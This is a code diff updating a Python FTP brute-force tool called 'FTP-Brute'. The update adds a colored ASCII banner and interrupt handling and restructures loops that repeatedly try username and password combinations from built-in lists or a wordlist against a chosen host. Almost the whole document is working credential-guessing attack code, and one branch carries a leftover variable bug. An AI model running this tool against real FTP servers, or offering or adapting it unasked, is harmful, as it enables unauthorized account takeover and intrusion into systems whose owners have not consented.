@@ -1,7 +1,18 @@
 import ftplib
 import argparse
+from colorama import Fore, Style
+import sys
 
-version = "v1.0.1"
+version = "v1.0.2"
+
+logo = r"""
+    ________________        ____             __     
+   / ____/_  __/ __ \      / __ )_______  __/ /____ 
+  / /_    / / / /_/ /_____/ __  / ___/ / / / __/ _ \
+ / __/   / / / ____/_____/ /_/ / /  / /_/ / /_/  __/
+/_/     /_/ /_/         /_____/_/   \__,_/\__/\___/ 
+                                                    
+"""
 
 ftpserver = ftplib.FTP()
 
@@ -162,99 +173,102 @@ passwords = [
 ]
 
 def bruteforce():
-    #bruteforce with given values
-    if args.username and args.password:
-        print(f"Bruteforcing with custom credentials: {args.username}:{args.password}")
-        try:
-            ftpserver.connect(args.host, args.port)
-            ftpserver.login(args.username, args.password)
-            print(f"Success: {args.username}:{args.password}")
-        except ftplib.all_errors as e:
-            print(f"Failed: {args.username}:{args.password} - {e}")
-    elif args.username:
-        print(f"Bruteforcing with custom credentials: {args.username}")
-        for pwd in passwords:
+    try:
+        print(f"{Fore.RED}{logo}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}Starting FTP-Brute: {Style.RESET_ALL}[{Fore.MAGENTA}{args.host}{Style.RESET_ALL}:{Fore.CYAN}{args.port}{Style.RESET_ALL}]")
+        #bruteforce with given values
+        if args.username and args.password:
+            print(f"Bruteforcing with custom credentials: {args.username}:{args.password}")
             try:
                 ftpserver.connect(args.host, args.port)
-                ftpserver.login(args.username, pwd)
-                print(f"Success: {args.username}:{pwd}")
+                ftpserver.login(args.username, args.password)
+                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {args.username}:{args.password}")
             except ftplib.all_errors as e:
-                print(f"Failed: {args.username}:{pwd} - {e}")
-    elif args.password:
-        print(f"Bruteforcing with custom credentials: {args.password}")
-        for user in usernames:
-            try:
-                ftpserver.connect(args.host, args.port)
-                ftpserver.login(user, args.password)
-                print(f"Success: {user}:{args.password}")
-            except ftplib.all_errors as e:
-                print(f"Failed: {user}:{args.password} - {e}")
-    else:
-        #bruteforcing with buildin list
-        for user in usernames:
+                print(f"Failed: {args.username}:{args.password} - {e}")
+        elif args.username:
+            print(f"Bruteforcing with custom credentials: {args.username}")
             for pwd in passwords:
-                print(f"Bruteforcing with buildin credentials: {args.password}")
                 try:
                     ftpserver.connect(args.host, args.port)
-                    ftpserver.login(user, pwd)
-                    print(f"Success: {user}:{pwd}")
-                    break
+                    ftpserver.login(args.username, pwd)
+                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {args.username}:{pwd}")
                 except ftplib.all_errors as e:
-                    print(f"Failed: {user}:{pwd} - {e}")
-                    continue
-
-    if args.wordlist:
-        try:
-            with open(args.wordlist, 'r') as file:
-                wordlist = file.readlines()
-                for user in wordlist:
-                    user = user.strip()
-                    for pwd in passwords:
-                        print(f"Bruteforcing with wordlist: {user}:{pwd}")
-                        try:
-                            ftpserver.connect(args.host, args.port)
-                            ftpserver.login(user, pwd)
-                            print(f"Success: {user}:{pwd}")
-                            break
-                        except ftplib.all_errors as e:
-                            print(f"Failed: {user}:{pwd} - {e}")
-        except FileNotFoundError:
-            print(f"Error: Wordlist file {args.wordlist} not found.")
-        except Exception as e:
-            print(f"Error: {e}")
-    elif args.username and args.wordlist:
-        try:
-            with open(args.wordlist, 'r') as file:
+                    print(f"Failed: {args.username}:{pwd} - {e}")
+        elif args.password:
+            print(f"Bruteforcing with custom credentials: {args.password}")
+            for user in usernames:
+                try:
+                    ftpserver.connect(args.host, args.port)
+                    ftpserver.login(user, args.password)
+                    print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {user}:{args.password}")
+                except ftplib.all_errors as e:
+                    print(f"Failed: {user}:{args.password} - {e}")
+        else:
+            #bruteforcing with buildin list
+            for user in usernames:
                 for pwd in passwords:
-                    print(f"Bruteforcing with wordlist: {args.username}:{pwd}")
-                    try:
-                        ftpserver.connect(args.host, args.port)
-                        ftpserver.login(args.username, pwd)
-                        print(f"Success: {args.username}:{pwd}")
-                        break
-                    except ftplib.all_errors as e:
-                        print(f"Failed: {args.username}:{pwd} - {e}")
-        except FileNotFoundError:
-            print(f"Error: Wordlist file {args.wordlist} not found.")
-        except Exception as e:
-            print(f"Error: {e}")
-    elif args.password and args.wordlist:
-        try:
-            with open(args.wordlist, 'r') as file:
-                for user in usernames:
-                    print(f"Bruteforcing with wordlist: {user}:{args.password}")
+                    print(f"Bruteforcing with buildin credentials: {user, pwd}")
                     try:
                         ftpserver.connect(args.host, args.port)
                         ftpserver.login(user, pwd)
-                        print(f"Success: {user}:{args.password}")
+                        print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {user}:{pwd}")
                         break
                     except ftplib.all_errors as e:
-                        print(f"Failed: {user}:{args.password} - {e}")
-        except FileNotFoundError:
-            print(f"Error: Wordlist file {args.wordlist} not found.")
-        except Exception as e:
-            print(f"Error: {e}")
-    else:
-        print("Error")
+                        print(f"Failed: {user}:{pwd} - {e}")
+                        continue
 
+        if args.wordlist:
+            try:
+                with open(args.wordlist, 'r') as file:
+                    wordlist = file.readlines()
+                    for user in wordlist:
+                        user = user.strip()
+                        for pwd in passwords:
+                            print(f"Bruteforcing with wordlist: {user}:{pwd}")
+                            try:
+                                ftpserver.connect(args.host, args.port)
+                                ftpserver.login(user, pwd)
+                                print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {user}:{pwd}")
+                                break
+                            except ftplib.all_errors as e:
+                                print(f"Failed: {user}:{pwd} - {e}")
+            except FileNotFoundError:
+                print(f"Error: Wordlist file {args.wordlist} not found.")
+            except Exception as e:
+                print(f"Error: {e}")
+        elif args.username and args.wordlist:
+            try:
+                with open(args.wordlist, 'r') as file:
+                    for pwd in passwords:
+                        print(f"Bruteforcing with wordlist: {args.username}:{pwd}")
+                        try:
+                            ftpserver.connect(args.host, args.port)
+                            ftpserver.login(args.username, pwd)
+                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {args.username}:{pwd}")
+                            break
+                        except ftplib.all_errors as e:
+                            print(f"Failed: {args.username}:{pwd} - {e}")
+            except FileNotFoundError:
+                print(f"Error: Wordlist file {args.wordlist} not found.")
+            except Exception as e:
+                print(f"Error: {e}")
+        elif args.password and args.wordlist:
+            try:
+                with open(args.wordlist, 'r') as file:
+                    for user in usernames:
+                        print(f"Bruteforcing with wordlist: {user}:{args.password}")
+                        try:
+                            ftpserver.connect(args.host, args.port)
+                            ftpserver.login(user, pwd)
+                            print(f"{Fore.GREEN}[+] Success:{Style.RESET_ALL} {user}:{args.password}")
+                            break
+                        except ftplib.all_errors as e:
+                            print(f"Failed: {user}:{args.password} - {e}")
+            except FileNotFoundError:
+                print(f"Error: Wordlist file {args.wordlist} not found.")
+            except Exception as e:
+                print(f"Error: {e}")
+    except KeyboardInterrupt:
+        print(f"{Fore.RED}Bye!{Style.RESET_ALL}")
+        sys.exit(0)  
 bruteforce()
